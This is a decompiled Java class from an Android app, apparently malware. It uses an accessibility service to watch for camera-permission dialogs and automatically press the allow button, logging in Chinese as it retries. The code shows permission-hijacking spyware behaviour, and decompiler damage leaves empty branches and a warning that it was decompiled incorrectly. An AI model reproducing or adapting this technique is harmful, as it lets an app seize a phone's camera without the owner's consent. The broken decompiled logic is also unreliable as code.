package com.storm.safe.rock.manager;

import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$startCameraPermissionDialogMonitoring$1", m214403f = "PermissionGranter.kt", m214404l = {5342, 5361}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$startCameraPermissionDialogMonitoring$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52025a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0260a2 f52026a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$startCameraPermissionDialogMonitoring$1(C0260a2 c0260a2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52026a2 = c0260a2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$startCameraPermissionDialogMonitoring$1(this.f52026a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$startCameraPermissionDialogMonitoring$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:61:0x00dc, code lost:
    
        if (p000.b81.m210571b1(1000, r14) == r2) goto L62;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x00f4, code lost:
    
        r15.recycle();
     */
    /* JADX WARN: Removed duplicated region for block: B:13:0x002f  */
    /* JADX WARN: Removed duplicated region for block: B:18:0x003f  */
    /* JADX WARN: Removed duplicated region for block: B:20:0x0045  */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0049  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x00ff  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:54:0x00c0 -> B:70:0x00f4). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x00dc -> B:63:0x00df). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:69:0x00ef -> B:70:0x00f4). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        String string;
        C0260a2 c0260a2 = this.f52026a2;
        dqtvuisjd dqtvuisjdVar = c0260a2.f52109a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52025a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            if (c0260a2.f52112a4) {
            }
            if (c0260a2.f52115a7 >= 8) {
            }
            return C1351vv.f60710b1;
        }
        if (i == 1) {
            kg1.m213544f4(obj);
            if (dqtvuisjdVar.checkSelfPermission("android.permission.CAMERA") == 0) {
            }
            if (c0260a2.f52115a7 >= 8) {
            }
            return C1351vv.f60710b1;
        }
        if (i != 2) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        if (dqtvuisjdVar.checkSelfPermission("android.permission.CAMERA") == 0) {
            c0260a2.f52112a4 = false;
            if (c0260a2.f52115a7 >= 8) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 摄像头权限申请超时");
                c0260a2.f52112a4 = false;
            }
            return C1351vv.f60710b1;
        }
        c0260a2.f52115a7++;
        if (c0260a2.f52112a4 && c0260a2.f52115a7 < 8) {
            this.f52025a1 = 1;
            if (b81.m210571b1(1500L, this) != coroutineSingletons) {
                if (dqtvuisjdVar.checkSelfPermission("android.permission.CAMERA") == 0) {
                    c0260a2.f52112a4 = false;
                } else if (dqtvuisjd.f52358m1.isServiceRunning()) {
                    dqtvuisjd dqtvuisjdVar2 = c0260a2.f52108a0;
                    try {
                    } catch (Exception e) {
                        t60.m214705c6("PermissionGranter", "❌ [权限] 检测权限对话框失败", e);
                    }
                    List<AccessibilityWindowInfo> windows = dqtvuisjdVar2.getWindows();
                    if (windows != null && !windows.isEmpty()) {
                        int size = windows.size();
                        for (int i2 = 0; i2 < size; i2++) {
                            CharSequence title = windows.get(i2).getTitle();
                            if (title == null || (string = title.toString()) == null) {
                                string = "";
                            }
                            if (AbstractC0779a1.m213652a5(string, "摄像头", true) || AbstractC0779a1.m213652a5(string, "拍摄照片", true) || AbstractC0779a1.m213652a5(string, "录制视频", true) || AbstractC0779a1.m213652a5(string, "camera", true) || AbstractC0779a1.m213652a5(string, "允许", true) || AbstractC0779a1.m213652a5(string, "permission", true)) {
                                c0260a2.m211331h4(string);
                            }
                        }
                    }
                    AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        AccessibilityNodeInfo accessibilityNodeInfoM211287d9 = C0260a2.m211287d9(rootInActiveWindow);
                        if (accessibilityNodeInfoM211287d9 == null) {
                            rootInActiveWindow.recycle();
                        } else if (c0260a2.m211333h6(accessibilityNodeInfoM211287d9)) {
                            accessibilityNodeInfoM211287d9.recycle();
                            rootInActiveWindow.recycle();
                            this.f52025a1 = 2;
                        } else {
                            accessibilityNodeInfoM211287d9.recycle();
                            rootInActiveWindow.recycle();
                        }
                    }
                    c0260a2.f52115a7++;
                    if (c0260a2.f52112a4) {
                        this.f52025a1 = 1;
                        if (b81.m210571b1(1500L, this) != coroutineSingletons) {
                        }
                    }
                } else {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 无障碍服务未运行，停止权限申请");
                    c0260a2.f52112a4 = false;
                }
            }
            return coroutineSingletons;
        }
        if (c0260a2.f52115a7 >= 8) {
        }
        return C1351vv.f60710b1;
    }
}
